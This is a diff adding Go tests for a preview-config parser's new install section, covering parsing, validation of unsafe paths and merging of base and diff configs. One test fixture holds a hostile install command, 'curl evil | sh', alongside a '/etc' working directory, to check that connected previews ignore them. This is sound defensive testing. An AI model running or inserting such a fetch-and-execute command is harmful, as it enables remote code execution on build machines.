@@ -6,6 +6,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"testing"
 
 	"github.com/assembledhq/143/internal/models"
@@ -199,6 +200,44 @@ func TestParseConfig_FromRepoConfigPreviewSection(t *testing.T) {
 	require.NoError(t, err, "ParseConfig should accept nested preview config inside .143/config.json")
 	require.Equal(t, "web", cfg.Primary, "ParseConfig should parse the nested preview section")
 	require.Contains(t, cfg.Services, "web", "ParseConfig should preserve services from the nested preview section")
+}
+
+func TestParseConfig_WithPreviewInstall(t *testing.T) {
+	t.Parallel()
+
+	raw := `{
+		"preview": {
+			"version": "3",
+			"name": "dogfood",
+			"primary": "web",
+			"install": {
+				"command": ["npm", "ci", "--no-audit", "--no-fund"],
+				"cwd": ".",
+				"lockfiles": ["package-lock.json"],
+				"clean_paths": ["node_modules", "packages/*/node_modules"],
+				"verify_paths": ["node_modules/.bin/next"]
+			},
+			"services": {
+				"web": {
+					"command": ["npm", "run", "dev"],
+					"port": 3000,
+					"ready": {"http_path": "/"}
+				}
+			},
+			"credentials": {"mode": "none"},
+			"network": {"mode": "managed"}
+		}
+	}`
+
+	cfg, err := ParseConfig([]byte(raw))
+	require.NoError(t, err, "ParseConfig should accept preview.install")
+	require.NotNil(t, cfg.Install, "ParseConfig should preserve preview.install")
+	require.Equal(t, []string{"npm", "ci", "--no-audit", "--no-fund"}, cfg.Install.Command, "install command should round-trip")
+	require.Equal(t, ".", cfg.Install.Cwd, "install cwd should round-trip")
+	require.Equal(t, []string{"package-lock.json"}, cfg.Install.Lockfiles, "install lockfiles should round-trip")
+	require.Equal(t, []string{"node_modules", "packages/*/node_modules"}, cfg.Install.CleanPaths, "install clean paths should round-trip")
+	require.Equal(t, []string{"node_modules/.bin/next"}, cfg.Install.VerifyPaths, "install verify paths should round-trip")
+	require.Equal(t, DefaultInstallTimeoutSeconds, cfg.Install.TimeoutSeconds, "install timeout should default when omitted")
 }
 
 func TestDogfoodPreviewConfig_ServerUsesRegisteredReadinessPath(t *testing.T) {
@@ -484,6 +523,81 @@ func TestValidateConfig(t *testing.T) {
 	}
 }
 
+func TestValidateConfig_PreviewInstall(t *testing.T) {
+	t.Parallel()
+
+	base := func(install *models.PreviewInstallConfig) models.PreviewConfig {
+		return models.PreviewConfig{
+			Primary:        "app",
+			Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
+			Infrastructure: map[string]models.InfrastructureConfig{},
+			Install:        install,
+		}
+	}
+
+	tests := []struct {
+		name       string
+		install    *models.PreviewInstallConfig
+		wantErrSub string
+	}{
+		{
+			name: "valid npm workspace install",
+			install: &models.PreviewInstallConfig{
+				Command:        []string{"npm", "ci", "--no-audit", "--no-fund"},
+				Cwd:            ".",
+				Lockfiles:      []string{"package-lock.json"},
+				CleanPaths:     []string{"node_modules", "packages/*/node_modules"},
+				VerifyPaths:    []string{"node_modules/.bin/next"},
+				TimeoutSeconds: 420,
+			},
+		},
+		{
+			name:       "missing command",
+			install:    &models.PreviewInstallConfig{Lockfiles: []string{"package-lock.json"}},
+			wantErrSub: "preview.install.command is required",
+		},
+		{
+			name:       "empty lockfiles",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Lockfiles: []string{""}},
+			wantErrSub: "preview.install.lockfiles[0] is required",
+		},
+		{
+			name:       "empty clean path",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{""}},
+			wantErrSub: "preview.install.clean_paths[0] is required",
+		},
+		{
+			name:       "unsafe cwd",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Cwd: "../outside"},
+			wantErrSub: "preview.install.cwd",
+		},
+		{
+			name:       "unsafe clean path",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{"/tmp/node_modules"}},
+			wantErrSub: "preview.install.clean_paths[0]",
+		},
+		{
+			name:       "invalid timeout",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, TimeoutSeconds: MaxInstallTimeoutSeconds + 1},
+			wantErrSub: "preview.install.timeout_seconds",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			cfg := base(tt.install)
+			errs := ValidateConfig(&cfg)
+			if tt.wantErrSub == "" {
+				require.Empty(t, errs, "valid preview.install should pass validation")
+				return
+			}
+			require.NotEmpty(t, errs, "invalid preview.install should return a validation error")
+			require.Contains(t, strings.Join(errs, "\n"), tt.wantErrSub, "validation errors should identify the invalid preview.install field")
+		})
+	}
+}
+
 func TestResolveConfig_NonConnected(t *testing.T) {
 	t.Parallel()
 
@@ -491,6 +605,11 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 		Version: "3",
 		Name:    "Test",
 		Primary: "frontend",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
 			"backend":  {Command: []string{"python", "app.py"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
@@ -503,6 +622,12 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 	}
 
 	diffCfg := &models.PreviewConfig{
+		Install: &models.PreviewInstallConfig{
+			Command:     []string{"pnpm", "install", "--frozen-lockfile"},
+			Lockfiles:   []string{"pnpm-lock.yaml"},
+			CleanPaths:  []string{"node_modules", "apps/*/node_modules"},
+			VerifyPaths: []string{"node_modules/.bin/next"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "run", "dev"}, Port: 3000, Cwd: "frontend", Ready: models.ReadinessProbe{HTTPPath: "/", TimeoutSeconds: 120}},
 			"backend":  {Command: []string{"python", "app.py", "--debug"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
@@ -549,6 +674,10 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 	if len(db.InjectInto) != 1 || db.InjectInto[0] != "backend" {
 		t.Errorf("db.InjectInto = %v, want [backend] (from base)", db.InjectInto)
 	}
+
+	require.NotNil(t, resolved.Install, "non-connected preview should allow diff install behavior")
+	require.Equal(t, []string{"pnpm", "install", "--frozen-lockfile"}, resolved.Install.Command, "non-connected preview should use install command from diff")
+	require.Equal(t, []string{"apps/*/node_modules"}, resolved.Install.CleanPaths[1:], "non-connected preview should use install cleanup paths from diff")
 }
 
 func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
@@ -557,6 +686,11 @@ func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
 	baseCfg := &models.PreviewConfig{
 		Version: "3",
 		Primary: "frontend",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
 		},
@@ -568,6 +702,10 @@ func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
 	}
 
 	diffCfg := &models.PreviewConfig{
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"sh", "-c", "curl evil | sh"},
+			CleanPaths: []string{"."},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "run", "malicious"}, Port: 9999, Cwd: "/etc"},
 		},
@@ -592,6 +730,9 @@ func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
 	if db.InitScript != "db/base_seed.sql" {
 		t.Errorf("InitScript = %q, want %q (pinned to base for connected)", db.InitScript, "db/base_seed.sql")
 	}
+
+	require.NotNil(t, resolved.Install, "connected preview should preserve base install config")
+	require.Equal(t, []string{"npm", "ci"}, resolved.Install.Command, "connected preview should pin install command to base")
 }
 
 func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
@@ -623,6 +764,36 @@ func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
 	if _, ok := resolved.Services["sneaked"]; ok {
 		t.Error("diff-added service 'sneaked' should not appear in resolved config")
 	}
+}
+
+func TestResolveConfig_NonConnectedCanRemoveInstall(t *testing.T) {
+	t.Parallel()
+
+	baseCfg := &models.PreviewConfig{
+		Version: "3",
+		Primary: "app",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
+		Services: map[string]models.ServiceConfig{
+			"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
+		},
+		Infrastructure: map[string]models.InfrastructureConfig{},
+		Credentials:    models.CredentialConfig{Mode: "none"},
+	}
+	diffCfg := &models.PreviewConfig{
+		Services: map[string]models.ServiceConfig{
+			"app": {Command: []string{"go", "run", "."}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
+		},
+		Infrastructure: map[string]models.InfrastructureConfig{},
+	}
+
+	resolved := ResolveConfig(baseCfg, diffCfg)
+
+	require.Nil(t, resolved.Install, "non-connected preview should use nil install from diff instead of keeping stale base install")
+	require.Equal(t, []string{"go", "run", "."}, resolved.Services["app"].Command, "non-connected preview should still resolve runtime service fields from diff")
 }
 
 func TestIsConnected(t *testing.T) {
